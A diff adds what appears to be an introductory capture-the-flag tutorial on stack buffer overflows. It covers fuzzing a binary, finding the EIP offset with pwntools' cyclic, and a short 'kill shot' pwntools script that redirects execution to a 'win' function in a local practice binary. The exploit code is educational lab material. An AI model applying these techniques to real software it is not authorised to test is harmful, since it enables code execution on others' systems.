@@ -1,0 +1,42 @@
+To take control of a program via Buffer Overflow, you need to find the exact moment the program's memory "spills over" and overwrites the Instruction Pointer (EIP/RIP)—the register that tells the CPU which line of code to execute next.
+The Buffer Overflow Workflow
+Step	Action	Tool / Command
+1. Fuzzing	Send increasingly long strings until the program crashes with a Segmentation Fault.	`python3 -c "print('A'*200)"
+2. Finding Offset	Use a unique pattern to find exactly which 'A's hit the EIP.	Metasploit's pattern_create
+3. Controlling EIP	Replace the pattern at that offset with BBBB. If EIP becomes 0x42424242, you own it.	gdb ./binary
+4. Redirecting	Point EIP to a "Win" function or your own shellcode.	Python + Pwntools
+Step-by-Step Execution in GDB
+Crash the Binary:
+Open the binary in GDB and run it with a massive input:
+bash
+gdb -q ./binary
+run $(python3 -c "print('A'*150)")
+Use code with caution.
+
+If it says Invalid address 0x41414141, you've successfully overwritten the instruction pointer with 'AAAA'.
+Find the Exact "Junk" Length:
+Use Pwntools to find the precise offset:
+python
+from pwn import *
+# Generate a pattern: Aa0Aa1Aa2...
+pattern = cyclic(150)
+# After crashing in GDB, see what value is in EIP (e.g., 0x61616167)
+offset = cyclic_find(0x61616167) 
+print(f"Distance to EIP: {offset}")
+Use code with caution.
+
+The "Kill Shot" Script:
+Once you have the offset (let's say it's 76) and the address of the flag function from Ghidra (let's say 0x080484b6), run this:
+python
+from pwn import *
+p = process('./binary')
+
+# Payload: 76 'A's + the address of the "Win" function in Little Endian
+payload = b"A" * 76 + p32(0x080484b6)
+
+p.sendline(payload)
+p.interactive() # Drops you into the shell or prints the flag
+Use code with caution.
+
+Why this is powerful
+You aren't just bypassing a password; you are reprogramming the binary while it runs to execute code it was never supposed to reach. This is how Remote Code Execution (RCE) works in the real world.
